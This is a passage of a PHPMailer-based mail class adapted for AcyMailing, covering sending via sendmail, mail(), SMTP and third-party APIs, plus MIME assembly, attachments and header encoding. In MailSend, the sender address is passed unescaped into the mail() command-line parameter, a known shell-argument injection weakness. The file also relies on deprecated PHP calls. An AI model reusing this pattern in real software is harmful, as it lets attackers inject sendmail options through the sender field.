                // we don't sign emails with DKIM if we cannot
		if(!empty($this->DKIM_domain) && !empty($this->DKIM_private)) {
			$header_dkim = $this->DKIM_Add($body);
			$header = str_replace("\r\n",$this->LE,$header_dkim) . $header;
		}


		/* Choose the mailer */
		switch($this->Mailer) {
			case 'sendmail':
				$result = $this->SendmailSend($header, $body);
				break;
			case 'smtp':
				$result = $this->SmtpSend($header, $body);
				break;
			case 'elasticemail' :
				$result = $this->elasticEmail->sendMail($this);
				if (!$result) $this->SetError($this->elasticEmail->error);
				break;
                        case 'sendgrid' :
				$result = $this->sendGrid->sendMail($this);
				if (!$result) $this->SetError($this->sendGrid->error);
				break;
                        case 'wpmail' :
                                $to = array_filter($this->to[0]);
                                add_filter('phpmailer_init',array($this,'wpmail_init'),90);
                                $result = wp_mail($to[0], $this->Subject, $this->Body, $header);

				break;
			default:
				$result = $this->MailSend($header, $body);
				break;
				//$this->SetError($this->Mailer . $this->Lang('mailer_not_supported'));
				//$result = false;
				//break;
		}

		return $result;
	}

	/**
	 * Sends mail using the $Sendmail program.
	 * @access private
	 * @return bool
	 */
	function SendmailSend($header, $body) {
		if ($this->Sender != '') {
			$sendmail = sprintf("%s -oi -f %s -t", escapeshellcmd($this->Sendmail), escapeshellarg($this->Sender));
		} else {
			$sendmail = sprintf("%s -oi -t", escapeshellcmd($this->Sendmail));
		}

		if(!@$mail = popen($sendmail, 'w')) {
			$this->SetError('execute' , $this->Sendmail);
			return false;
		}

		fputs($mail, $header);
		fputs($mail, $body);

		$result = pclose($mail);
		if (version_compare(phpversion(), '4.2.3') == -1) {
			$result = $result >> 8 & 0xFF;
		}
		if($result != 0) {
			$this->SetError('execute' , $this->Sendmail);
			return false;
		}
		return true;
	}

	/**
	 * Sends mail using the PHP mail() function.
	 * @access private
	 * @return bool
	 */
	function MailSend($header, $body) {

		$to = '';
		for($i = 0; $i < count($this->to); $i++) {
			if($i != 0) { $to .= ', '; }
			$to .= $this->AddrFormat($this->to[$i]);
		}

		$toArr = explode(',', $to);

		if (!empty($this->Sender) && !(bool)ini_get('safe_mode')) {
			//shouldnot it be -f%s ?
			$params = sprintf("-oi -f %s", $this->Sender);
			$old_from = ini_get('sendmail_from');
			ini_set('sendmail_from', $this->Sender);
			if ($this->SingleTo === true && count($toArr) > 1) {
				foreach ($toArr as $key => $val) {
					$rt = mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
				}
			} else {
				$rt = mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header, $params);
			}
			ini_set('sendmail_from', $old_from);
		} else {
			if ($this->SingleTo === true && count($toArr) > 1) {
				foreach ($toArr as $key => $val) {
					$rt = mail($val, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header);
				}
			} else {
				$rt = mail($to, $this->EncodeHeader($this->SecureHeader($this->Subject)), $body, $header);
			}
		}

		if(!$rt) {
			$this->SetError('instantiate');
			return false;
		}

		return true;
	}

	/**
	 * Sends mail via SMTP using PhpSMTP (Author:
	 * Chris Ryan).  Returns bool.  Returns false if there is a
	 * bad MAIL FROM, RCPT, or DATA input.
	 * @access private
	 * @return bool
	 */
	function SmtpSend($header, $body) {
		include_once(dirname(__FILE__).DS. 'class.smtp.php');
		$error = '';
		$bad_rcpt = array();

		if(!$this->SmtpConnect()) {
			return false;
		}

		$smtp_from = ($this->Sender == '') ? $this->From : $this->Sender;
		if(!$this->smtp->Mail($smtp_from)) {

			$this->SetError('from_failed', $smtp_from);
			$this->smtp->Reset();
			return false;
		}

		/* Attempt to send attach all recipients */
		for($i = 0; $i < count($this->to); $i++) {
			if(!$this->smtp->Recipient($this->to[$i][0])) {
				$bad_rcpt[] = $this->to[$i][0];
			}
		}
		for($i = 0; $i < count($this->cc); $i++) {
			if(!$this->smtp->Recipient($this->cc[$i][0])) {
				$bad_rcpt[] = $this->cc[$i][0];
			}
		}
		for($i = 0; $i < count($this->bcc); $i++) {
			if(!$this->smtp->Recipient($this->bcc[$i][0])) {
				$bad_rcpt[] = $this->bcc[$i][0];
			}
		}

		if(count($bad_rcpt) > 0) { // Create error message
			for($i = 0; $i < count($bad_rcpt); $i++) {
				if($i != 0) {
					$error .= ', ';
				}
				$error .= $bad_rcpt[$i];
			}

			$this->SetError('recipients_failed', $error);
			$this->smtp->Reset();
			return false;
		}

		if(!$this->smtp->Data($header . $body)) {
			//We display a better error message for that error, it may help us to move forward in some cases...
			$errorInfos = empty($this->smtp->error['error']) ? 'data_not_accepted' : $this->smtp->error['error'];

			//Then we add additional data...
			if(!empty($this->smtp->error['smtp_code'])) $errorInfos .= ' '.$this->smtp->error['smtp_code'];
			if(!empty($this->smtp->error['smtp_msg'])) $errorInfos .= ' '.$this->smtp->error['smtp_msg'];
			$this->SetError($errorInfos);
			$this->smtp->Reset();
			return false;
		}
		if($this->SMTPKeepAlive == true) {
			$this->smtp->Reset();
		} else {
			$this->SmtpClose();
		}

		return true;
	}

	/**
	 * Initiates a connection to an SMTP server.  Returns false if the
	 * operation failed.
	 * @access private
	 * @return bool
	 */
	function SmtpConnect() {
		if($this->smtp == NULL) {
			$this->smtp = new acymailingSMTP();
		}

		$this->smtp->do_debug = $this->SMTPDebug;
		$hosts = explode(';', $this->Host);
		$index = 0;
		$connection = ($this->smtp->Connected());

		/* Retry while there is no connection */
		while($index < count($hosts) && $connection == false) {
			$hostinfo = array();
			if(preg_match('#^(.+):([0-9]+)$#i', $hosts[$index], $hostinfo)) {
				$host = $hostinfo[1];
				$port = $hostinfo[2];
			} else {
				$host = $hosts[$index];
				$port = $this->Port;
			}

			$tls = ($this->SMTPSecure == 'tls');
			$ssl = ($this->SMTPSecure == 'ssl');

			if($this->smtp->Connect(($ssl ? 'ssl://':'').$host, $port, $this->Timeout)) {
			$hello = ($this->Helo != '' ? $this->Helo : $this->ServerHostname());
			$this->smtp->Hello($hello);

			if($tls) {
				if(!$this->smtp->StartTLS()) {
				$this->smtp->Reset();
				$connection = false;
				break;
				}

				//We must resend HELO after tls negotiation
				$this->smtp->Hello($hello);
			}

				$connection = true;
				if($this->SMTPAuth) {
					if(!$this->smtp->Authenticate($this->Username, $this->Password)) {
						$this->SetError('authenticate');
						$this->smtp->Reset();
						$connection = false;
					}
				}
			}
			$index++;
		}
		if(!$connection) {
			$this->SetError('connect_host');
		}

		return $connection;
	}

	/**
	 * Closes the active SMTP session if one exists.
	 * @return void
	 */
	function SmtpClose() {
		if($this->smtp != NULL) {
			if($this->smtp->Connected()) {
				$this->smtp->Quit();
				$this->smtp->Close();
			}
		}

		if(!empty($this->elasticEmail->conn)){
			$this->elasticEmail->close();
		}
	}

	/**
	 * Sets the language for all class error messages.  Returns false
	 * if it cannot load the language file.  The default language type
	 * is English.
	 * @param string $lang_type Type of language (e.g. Portuguese: "br")
	 * @param string $lang_path Path to the language file directory
	 * @access public
	 * @return bool
	 */
	function SetLanguage($lang_type, $lang_path = 'language/') {

		$PHPMAILER_LANG = array();
		$PHPMAILER_LANG["provide_address"]      = 'You must provide at least one ' .
		$PHPMAILER_LANG["mailer_not_supported"] = ' mailer is not supported.';
		$PHPMAILER_LANG["execute"]              = 'Could not execute: ';
		$PHPMAILER_LANG["instantiate"]          = 'Could not instantiate mail function.';
		$PHPMAILER_LANG["authenticate"]         = 'SMTP Error: Could not authenticate.';
		$PHPMAILER_LANG["from_failed"]          = 'The following From address failed: ';
		$PHPMAILER_LANG["recipients_failed"]    = 'SMTP Error: The following ' .
		$PHPMAILER_LANG["data_not_accepted"]    = 'SMTP Error: Data not accepted.';
		$PHPMAILER_LANG["connect_host"]         = 'SMTP Error: Could not connect to SMTP host.';
		$PHPMAILER_LANG["file_access"]          = 'Could not access file: ';
		$PHPMAILER_LANG["file_open"]            = 'File Error: Could not open file: ';
		$PHPMAILER_LANG["encoding"]             = 'Unknown encoding: ';
		$PHPMAILER_LANG["signing"]              = 'Signing Error: ';

		$this->language = $PHPMAILER_LANG;

		return true;
	}

	/////////////////////////////////////////////////
	// METHODS, MESSAGE CREATION
	/////////////////////////////////////////////////

	/**
	 * Creates recipient headers.
	 * @access private
	 * @return string
	 */
	function AddrAppend($type, $addr) {
		$addr_str = $type . ': ';
		$addr_str .= $this->AddrFormat($addr[0]);
		if(count($addr) > 1) {
			for($i = 1; $i < count($addr); $i++) {
				$addr_str .= ', ' . $this->AddrFormat($addr[$i]);
			}
		}
		$addr_str .= $this->LE;

		return $addr_str;
	}

	/**
	 * Formats an address correctly.
	 * @access private
	 * @return string
	 */
	function AddrFormat($addr) {
		if(empty($addr[1])) {
			$formatted = $this->SecureHeader($addr[0]);
		} else {
			$formatted = $this->EncodeHeader($this->SecureHeader($addr[1]), 'phrase') . " <" . $this->SecureHeader($addr[0]) . ">";
		}

		return $formatted;
	}

	/**
	 * Wraps message for use with mailers that do not
	 * automatically perform wrapping and for quoted-printable.
	 * Original written by philippe.
	 * @access private
	 * @return string
	 */
	function WrapText($message, $length, $qp_mode = false) {
		$soft_break = ($qp_mode) ? sprintf(" =%s", $this->LE) : $this->LE;
		// If utf-8 encoding is used, we will need to make sure we don't
		// split multibyte characters when we wrap
		$is_utf8 = (strtolower($this->CharSet) == "utf-8");

		$message = $this->FixEOL($message);
		if (substr($message, -1) == $this->LE) {
			$message = substr($message, 0, -1);
		}

		$line = explode($this->LE, $message);
		$message = '';
		for ($i=0 ;$i < count($line); $i++) {
			$line_part = explode(' ', $line[$i]);
			$buf = '';
			for ($e = 0; $e<count($line_part); $e++) {
				$word = $line_part[$e];
				if ($qp_mode and (strlen($word) > $length)) {
					$space_left = $length - strlen($buf) - 1;
					if ($e != 0) {
						if ($space_left > 20) {
							$len = $space_left;
							if ($is_utf8) {
								$len = $this->UTF8CharBoundary($word, $len);
							} elseif (substr($word, $len - 1, 1) == "=") {
								$len--;
							} elseif (substr($word, $len - 2, 1) == "=") {
								$len -= 2;
							}
							$part = substr($word, 0, $len);
							$word = substr($word, $len);
							$buf .= ' ' . $part;
							$message .= $buf . sprintf("=%s", $this->LE);
						} else {
							$message .= $buf . $soft_break;
						}
						$buf = '';
					}
					while (strlen($word) > 0) {
						$len = $length;
						if ($is_utf8) {
							$len = $this->UTF8CharBoundary($word, $len);
						} elseif (substr($word, $len - 1, 1) == "=") {
							$len--;
						} elseif (substr($word, $len - 2, 1) == "=") {
							$len -= 2;
						}
						$part = substr($word, 0, $len);
						$word = substr($word, $len);

						if (strlen($word) > 0) {
							$message .= $part . sprintf("=%s", $this->LE);
						} else {
							$buf = $part;
						}
					}
				} else {
					$buf_o = $buf;
					$buf .= ($e == 0) ? $word : (' ' . $word);

					if (strlen($buf) > $length and $buf_o != '') {
						$message .= $buf_o . $soft_break;
						$buf = $word;
					}
				}
			}
			$message .= $buf . $this->LE;
		}

		return $message;
	}

	/**
	 * Finds last character boundary prior to maxLength in a utf-8
	 * quoted (printable) encoded string.
	 * Original written by Colin Brown.
	 * @access private
	 * @param string $encodedText utf-8 QP text
	 * @param int    $maxLength   find last character boundary prior to this length
	 * @return int
	 */
	function UTF8CharBoundary($encodedText, $maxLength) {
		$foundSplitPos = false;
		$lookBack = 3;
		while (!$foundSplitPos) {
			$lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack);
			$encodedCharPos = strpos($lastChunk, "=");
			if ($encodedCharPos !== false) {
				// Found start of encoded character byte within $lookBack block.
				// Check the encoded byte value (the 2 chars after the '=')
				$hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2);
				$dec = hexdec($hex);
				if ($dec < 128) { // Single byte character.
					// If the encoded char was found at pos 0, it will fit
					// otherwise reduce maxLength to start of the encoded char
					$maxLength = ($encodedCharPos == 0) ? $maxLength :
					$maxLength - ($lookBack - $encodedCharPos);
					$foundSplitPos = true;
				} elseif ($dec >= 192) { // First byte of a multi byte character
					// Reduce maxLength to split at start of character
					$maxLength = $maxLength - ($lookBack - $encodedCharPos);
					$foundSplitPos = true;
				} elseif ($dec < 192) { // Middle byte of a multi byte character, look further back
					$lookBack += 3;
				}
			} else {
				// No encoded character found
				$foundSplitPos = true;
			}
		}
		return $maxLength;
	}

	/**
	 * Set the body wrapping.
	 * @access private
	 * @return void
	 */
	function SetWordWrap() {
		if($this->WordWrap < 1) {
			return;
		}

	if(!empty($this->AltBody)) $this->AltBody = $this->WrapText($this->AltBody, $this->WordWrap);
	$this->Body = $this->WrapText($this->Body, $this->WordWrap);
	}

	/**
	 * Assembles message header.
	 * @access private
	 * @return string
	 */
	function CreateHeader() {
		$result = '';

		/* Set the boundaries */
		$uniq_id = md5(uniqid(time()));
		$this->boundary[1] = 'b1_' . $uniq_id;
		$this->boundary[2] = 'b2_' . $uniq_id;
		$this->boundary[3] = 'b3_' . $uniq_id;

		$result .= $this->HeaderLine('Date', $this->RFCDate());
		if($this->Sender == '') {
			$result .= $this->HeaderLine('Return-Path', trim($this->From));
		} else {
			$result .= $this->HeaderLine('Return-Path', trim($this->Sender));
		}

		/* To be created automatically by mail() */
		if($this->Mailer != 'mail') {
			if(count($this->to) > 0) {
				$result .= $this->AddrAppend('To', $this->to);
			} elseif (count($this->cc) == 0) {
				$result .= $this->HeaderLine('To', 'undisclosed-recipients:;');
			}
		}

		$from = array();
		$from[0][0] = trim($this->From);
		$from[0][1] = $this->FromName;
		$result .= $this->AddrAppend('From', $from);

		/* sendmail and mail() extract Cc from the header before sending */
		if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->cc) > 0)) {
			$result .= $this->AddrAppend('Cc', $this->cc);
		}

		/* sendmail and mail() extract Bcc from the header before sending */
		if((($this->Mailer == 'sendmail') || ($this->Mailer == 'mail')) && (count($this->bcc) > 0)) {
			$result .= $this->AddrAppend('Bcc', $this->bcc);
		}

		if(count($this->ReplyTo) > 0) {
			$result .= $this->AddrAppend('Reply-To', $this->ReplyTo);
		}

		/* mail() sets the subject itself */
		if($this->Mailer != 'mail') {
			$result .= $this->HeaderLine('Subject', $this->EncodeHeader($this->SecureHeader($this->Subject)));
		}

		if($this->MessageID != '') {
			$result .= $this->HeaderLine('Message-ID',$this->MessageID);
		} else {
			$result .= sprintf("Message-ID: <%s@%s>%s", $uniq_id, $this->ServerHostname(), $this->LE);
		}
		$result .= $this->HeaderLine('X-Priority', $this->Priority);
		$result .= $this->HeaderLine('X-Mailer', 'PHPMailer (phpmailer.sourceforge.net) [version ' . $this->Version . ']');

		if($this->ConfirmReadingTo != '') {
			$result .= $this->HeaderLine('Disposition-Notification-To', '<' . trim($this->ConfirmReadingTo) . '>');
		}

		// Add custom headers
		for($index = 0; $index < count($this->CustomHeader); $index++) {
			$result .= $this->HeaderLine(trim($this->CustomHeader[$index][0]), $this->EncodeHeader(trim($this->CustomHeader[$index][1])));
		}
		if (!$this->sign_key_file) {
			$result .= $this->HeaderLine('MIME-Version', '1.0');
			$result .= $this->GetMailMIME();
		}

		return $result;
	}

	/**
	 * Returns the message MIME.
	 * @access private
	 * @return string
	 */
	function GetMailMIME() {
		 $result = '';
		switch($this->message_type) {
			case 'plain':
				$result .= $this->HeaderLine('Content-Transfer-Encoding', $this->Encoding);
				$result .= $this->TextLine('Content-Type: '.$this->ContentType.'; charset="'.$this->CharSet.'"');
				break;
			case 'inline':
				$result .= $this->HeaderLine('Content-Type', 'multipart/related;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
				break;
			case 'attach':
			case 'inline_attach':
			case 'alt_attach':
			case 'alt_inline_attach':
				$result .= $this->HeaderLine('Content-Type', 'multipart/mixed;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
				break;
			case 'alt':
			case 'alt_inline':
				$result .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[1] . '"');
				break;
		}

	//Added by Adrien on 11.02.2011 and then on 06 April 2011 otherwise we have 3 return char on phpMail or other functions
	$result = rtrim($result,$this->LE);
		if($this->Mailer != 'mail') {
			$result .= $this->LE.$this->LE;
		}

		return $result;
	}

	/**
	 * Assembles the message body.  Returns an empty string on failure.
	 * @access private
	 * @return string
	 */
	function CreateBody() {
		$result = '';
		if ($this->sign_key_file) {
			$result .= $this->GetMailMIME();
		}

		$this->SetWordWrap();

                    switch($this->message_type) {
			case 'plain':
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				break;
			case 'inline':
				$result .= $this->GetBoundary($this->boundary[1], '', '', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->AttachAll("inline", $this->boundary[1]);
				break;
			case 'attach':
				$result .= $this->GetBoundary($this->boundary[1], '', '', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->AttachAll("attachment", $this->boundary[1]);
				break;
			case 'inline_attach':
				$result .= $this->TextLine("--" . $this->boundary[1]);
				$result .= $this->HeaderLine('Content-Type', 'multipart/related;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[2] . '"');
				$result .= $this->LE;
				$result .= $this->GetBoundary($this->boundary[2], '', '', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->AttachAll("inline", $this->boundary[2]);
				$result .= $this->LE;
				$result .= $this->AttachAll("attachment", $this->boundary[1]);
				break;
			case 'alt':
				$result .= $this->GetBoundary($this->boundary[1], '', 'text/plain', '');
				$result .= $this->EncodeString($this->AltBody, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->GetBoundary($this->boundary[1], '', 'text/html', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->EndBoundary($this->boundary[1]);
				break;
			case 'alt_inline':
				$result .= $this->GetBoundary($this->boundary[1], '', 'text/plain', '');
				$result .= $this->EncodeString($this->AltBody, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->TextLine("--" . $this->boundary[1]);
				$result .= $this->HeaderLine('Content-Type', 'multipart/related;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[2] . '"');
				$result .= $this->LE;
				$result .= $this->GetBoundary($this->boundary[2], '', 'text/html', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->AttachAll("inline", $this->boundary[2]);
				$result .= $this->LE;
				$result .= $this->EndBoundary($this->boundary[1]);
				break;
			case 'alt_attach':
				$result .= $this->TextLine("--" . $this->boundary[1]);
				$result .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[2] . '"');
				$result .= $this->LE;
				$result .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '');
				$result .= $this->EncodeString($this->AltBody, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->GetBoundary($this->boundary[2], '', 'text/html', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->EndBoundary($this->boundary[2]);
				$result .= $this->LE;
				$result .= $this->AttachAll("attachment", $this->boundary[1]);
				break;
			case 'alt_inline_attach':
				$result .= $this->TextLine("--" . $this->boundary[1]);
				$result .= $this->HeaderLine('Content-Type', 'multipart/alternative;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[2] . '"');
				$result .= $this->LE;
				$result .= $this->GetBoundary($this->boundary[2], '', 'text/plain', '');
				$result .= $this->EncodeString($this->AltBody, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->TextLine("--" . $this->boundary[2]);
				$result .= $this->HeaderLine('Content-Type', 'multipart/related;');
				$result .= $this->TextLine("\tboundary=\"" . $this->boundary[3] . '"');
				$result .= $this->LE;
				$result .= $this->GetBoundary($this->boundary[3], '', 'text/html', '');
				$result .= $this->EncodeString($this->Body, $this->Encoding);
				$result .= $this->LE.$this->LE;
				$result .= $this->AttachAll("inline", $this->boundary[3]);
				$result .= $this->LE;
				$result .= $this->EndBoundary($this->boundary[2]);
				$result .= $this->LE;
				$result .= $this->AttachAll("attachment", $this->boundary[1]);
				break;
		}

		if($this->IsError()) {
			$result = '';
		} else if ($this->sign_key_file) {
			$file = tempnam("", "mail");
			$fp = fopen($file, "w");
			fwrite($fp, $result);
			fclose($fp);
			$signed = tempnam("", "signed");

			if (@openssl_pkcs7_sign($file, $signed, "file://".$this->sign_cert_file, array("file://".$this->sign_key_file, $this->sign_key_pass), null)) {
				$fp = fopen($signed, "r");
				$result = fread($fp, filesize($this->sign_key_file));
				$result = '';
				while(!feof($fp)){
					$result = $result . fread($fp, 1024);
				}
				fclose($fp);
			} else {
				$this->SetError('signing',openssl_error_string());
				$result = '';
			}

			unlink($file);
			unlink($signed);
		}

		return $result;
	}

	/**
	 * Returns the start of a message boundary.
	 * @access private
	 */
	function GetBoundary($boundary, $charSet, $contentType, $encoding) {
		$result = '';
		if($charSet == '') {
			$charSet = $this->CharSet;
		}
		if($contentType == '') {
			$contentType = $this->ContentType;
		}
		if($encoding == '') {
			$encoding = $this->Encoding;
		}
		$result .= $this->TextLine('--' . $boundary);
		$result .= sprintf("Content-Type: %s; charset=\"%s\"", $contentType, $charSet);
		$result .= $this->LE;
		$result .= $this->HeaderLine('Content-Transfer-Encoding', $encoding);
		$result .= $this->LE;

		return $result;
	}

	/**
	 * Returns the end of a message boundary.
	 * @access private
	 */
	function EndBoundary($boundary) {
		return $this->LE . '--' . $boundary . '--' . $this->LE;
	}

	/**
	 * Sets the message type.
	 * @access private
	 * @return void
	 */
	function SetMessageType() {
	$this->message_type = array();
		if($this->AlternativeExists()) $this->message_type[] = "alt";
		if($this->InlineImageExists()) $this->message_type[] = "inline";
		if($this->AttachmentExists()) $this->message_type[] = "attach";
		$this->message_type = implode("_", $this->message_type);
		if($this->message_type == "") $this->message_type = "plain";
	}

	function AttachmentExists() {
		foreach($this->attachment as $attachment) {
			if ($attachment[6] == 'attachment') {
				return true;
			}
		}
		return false;
	}

	function AlternativeExists() {
		return strlen($this->AltBody)>0;
	}

	/* Returns a formatted header line.
	 * @access private
	 * @return string
	 */
	function HeaderLine($name, $value) {
		return $name . ': ' . $value . $this->LE;
	}

	/**
	 * Returns a formatted mail line.
	 * @access private
	 * @return string
	 */
	function TextLine($value) {
		return $value . $this->LE;
	}

	/////////////////////////////////////////////////
	// CLASS METHODS, ATTACHMENTS  /////////////////////////////////////////////////

	/**
	 * Adds an attachment from a path on the filesystem.
	 * Returns false if the file could not be found
	 * or accessed.
	 * @param string $path Path to the attachment.
	 * @param string $name Overrides the attachment name.
	 * @param string $encoding File encoding (see $Encoding).
	 * @param string $type File extension (MIME) type.
	 * @return bool
	 */
	function AddAttachment($path, $name = '', $encoding = 'base64', $type = 'application/octet-stream') {
		if(!@is_file($path)) {
			$this->SetError('file_access', $path);
			return false;
		}

		$filename = basename($path);
		if($name == '') {
			$name = $filename;
		}

		$cur = count($this->attachment);
		$this->attachment[$cur][0] = $path;
		$this->attachment[$cur][1] = $filename;
		$this->attachment[$cur][2] = $name;
		$this->attachment[$cur][3] = $encoding;
		$this->attachment[$cur][4] = $type;
		$this->attachment[$cur][5] = false; // isStringAttachment
		$this->attachment[$cur][6] = 'attachment';
		$this->attachment[$cur][7] = 0;

		return true;
	}

	/**
	 * Attaches all fs, string, and binary attachments to the message.
	 * Returns an empty string on failure.
	 * @access private
	 * @return string
	 */
	function AttachAll($disposition_type, $boundary) {
		// Return text of body
		$mime = array();
		$cidUniq = array();
		$incl = array();

		// Add all attachments
		foreach ($this->attachment as $attachment) {
			// CHECK IF IT IS A VALID DISPOSITION_FILTER
			if($attachment[6] == $disposition_type) {
				// Check for string attachment
				$bString = $attachment[5];
				if ($bString) {
					$string = $attachment[0];
				} else {
					$path = $attachment[0];
				}

				$inclhash = md5(serialize($attachment));
				if (in_array($inclhash, $incl)) { continue; }
				$incl[]      = $inclhash;
				$filename    = $attachment[1];
				$name        = $attachment[2];
				$encoding    = $attachment[3];
				$type        = $attachment[4];
				$disposition = $attachment[6];
				$cid         = $attachment[7];
				if ( $disposition == 'inline' && isset($cidUniq[$cid]) ) { continue; }
				$cidUniq[$cid] = true;

				$mime[] = sprintf("--%s%s", $boundary, $this->LE);
				$mime[] = sprintf("Content-Type: %s; name=\"%s\"%s", $type, $this->EncodeHeader($this->SecureHeader($name)), $this->LE);
				$mime[] = sprintf("Content-Transfer-Encoding: %s%s", $encoding, $this->LE);

				if($disposition == 'inline') {
					$mime[] = sprintf("Content-ID: <%s>%s", $cid, $this->LE);
				}

				$mime[] = sprintf("Content-Disposition: %s; filename=\"%s\"%s", $disposition, $this->EncodeHeader($this->SecureHeader($name)), $this->LE.$this->LE);

				// Encode as string attachment
				if($bString) {
					$mime[] = $this->EncodeString($string, $encoding);
					if($this->IsError()) {
						return '';
					}
					$mime[] = $this->LE.$this->LE;
				} else {
					$mime[] = $this->EncodeFile($path, $encoding);
					if($this->IsError()) {
						return '';
					}
					$mime[] = $this->LE.$this->LE;
				}
			}
		}

		$mime[] = sprintf("--%s--%s", $boundary, $this->LE);

		return implode("", $mime);
	}

	/**
	 * Encodes attachment in requested format.  Returns an
	 * empty string on failure.
	 * @access private
	 * @return string
	 */
	function EncodeFile ($path, $encoding = 'base64') {
		if(!@$fd = fopen($path, 'rb')) {
			$this->SetError('file_open', $path);
			return '';
		}

	$magic_quotes = get_magic_quotes_runtime();
	if(!empty($magic_quotes)) ini_set('magic_quotes_runtime', 0);
	$file_buffer = fread($fd, filesize($path));
	$file_buffer = $this->EncodeString($file_buffer, $encoding);
		fclose($fd);
	if(!empty($magic_quotes)) ini_set('magic_quotes_runtime',$magic_quotes);


		return $file_buffer;
	}

	/**
	 * Encodes string to requested format. Returns an
	 * empty string on failure.
	 * @access private
	 * @return string
	 */
	function EncodeString ($str, $encoding = 'base64') {
		$encoded = '';
		switch(strtolower($encoding)) {
			case 'base64':
				/* chunk_split is found in PHP >= 3.0.6 */
				$encoded = chunk_split(base64_encode($str), 76, $this->LE);
				break;
			case '7bit':
			case '8bit':
				$encoded = $this->FixEOL($str);
				if (substr($encoded, -(strlen($this->LE))) != $this->LE)
					$encoded .= $this->LE;
				break;
			case 'binary':
				$encoded = $str;
				break;
			case 'quoted-printable':
				$encoded = $this->EncodeQP($str);
				break;
			default:
				$this->SetError('encoding', $encoding);
				break;
		}
		return $encoded;
	}

	/**
	 * Encode a header string to best of Q, B, quoted or none.
	 * @access private
	 * @return string
	 */
	function EncodeHeader ($str, $position = 'text') {
		$x = 0;

		switch (strtolower($position)) {
			case 'phrase':
				if (!preg_match('/[\200-\377]/', $str)) {
					/* Can't use addslashes as we don't know what value has magic_quotes_sybase. */
					$encoded = addcslashes($str, "\0..\37\177\\\"");
					if (($str == $encoded) && !preg_match('/[^A-Za-z0-9!#$%&\'*+\/=?^_`{|}~ -]/', $str)) {
						return ($encoded);
					} else {
						return ("\"$encoded\"");
					}
				}
				$x = preg_match_all('/[^\040\041\043-\133\135-\176]/', $str, $matches);
				break;
			case 'comment':
				$x = preg_match_all('/[()"]/', $str, $matches);
				/* Fall-through */
			case 'text':
			default:
				$x += preg_match_all('/[\000-\010\013\014\016-\037\177-\377]/', $str, $matches);
				break;
		}

		if ($x == 0) {
			return ($str);
		}

		$maxlen = 75 - 7 - strlen($this->CharSet);
		/* Try to select the encoding which should produce the shortest output */
		if (strlen($str)/3 < $x) {
			$encoding = 'B';
			if (function_exists('mb_strlen') && $this->HasMultiBytes($str)) {
		 // Use a custom function which correctly encodes and wraps long
		 // multibyte strings without breaking lines within a character
				$encoded = $this->Base64EncodeWrapMB($str);
			} else {
				$encoded = base64_encode($str);
				$maxlen -= $maxlen % 4;
				$encoded = trim(chunk_split($encoded, $maxlen, "\n"));
			}
		} else {
			$encoding = 'Q';
			$encoded = $this->EncodeQ($str, $position);
			$encoded = $this->WrapText($encoded, $maxlen, true);
			$encoded = str_replace('='.$this->LE, "\n", trim($encoded));
		}

		$encoded = preg_replace('/^(.*)$/m', " =?".$this->CharSet."?$encoding?\\1?=", $encoded);
		$encoded = trim(str_replace("\n", $this->LE, $encoded));

		return $encoded;
	}

	/**
	 * Checks if a string contains multibyte characters.
	 * @access private
	 * @param string $str multi-byte text to wrap encode
	 * @return bool
	 */
	function HasMultiBytes($str) {
		if (function_exists('mb_strlen')) {
			return (strlen($str) > mb_strlen($str, $this->CharSet));
		} else { // Assume no multibytes (we can't handle without mbstring functions anyway)
			return False;
		}
	}

	/**
	 * Correctly encodes and wraps long multibyte strings for mail headers
	 * without breaking lines within a character.
	 * Adapted from a function by paravoid at http://uk.php.net/manual/en/function.mb-encode-mimeheader.php
	 * @access private
	 * @param string $str multi-byte text to wrap encode
	 * @return string
	 */
	function Base64EncodeWrapMB($str) {
		$start = "=?".$this->CharSet."?B?";
		$end = "?=";
		$encoded = "";

		$mb_length = mb_strlen($str, $this->CharSet);
		// Each line must have length <= 75, including $start and $end
		$length = 75 - strlen($start) - strlen($end);
		// Average multi-byte ratio
		$ratio = $mb_length / strlen($str);
		// Base64 has a 4:3 ratio
		$offset = $avgLength = floor($length * $ratio * .75);

		for ($i = 0; $i < $mb_length; $i += $offset) {
			$lookBack = 0;

			do {
				$offset = $avgLength - $lookBack;
				$chunk = mb_substr($str, $i, $offset, $this->CharSet);
				$chunk = base64_encode($chunk);
				$lookBack++;
			}
			while (strlen($chunk) > $length);

			$encoded .= $chunk . $this->LE;
		}

		// Chomp the last linefeed
		$encoded = substr($encoded, 0, -strlen($this->LE));
		return $encoded;
	}

	/**
	 * Encode string to quoted-printable.
	 * @access private
	 * @return string
	 */
	function EncodeQP( $input = '', $line_max = 76, $space_conv = false ) {
